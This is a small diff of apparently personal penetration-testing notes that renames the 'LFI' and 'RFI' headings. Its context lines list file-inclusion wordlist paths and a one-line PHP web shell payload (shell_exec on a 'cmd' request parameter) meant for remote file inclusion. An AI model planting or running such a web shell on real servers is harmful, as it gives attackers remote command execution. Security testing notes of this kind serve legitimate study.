@@ -72,7 +72,7 @@
 
 <code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</code>
 
-#### LFI Lists
+#### LFI
 
 Linux: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>
 
@@ -80,7 +80,7 @@ Windows: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-wi
 
 Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>
 
-#### RFI Payload
+#### RFI
 
 <code>ge?php echo shell_exec($_GET['cmd']); ?\le</code>
 
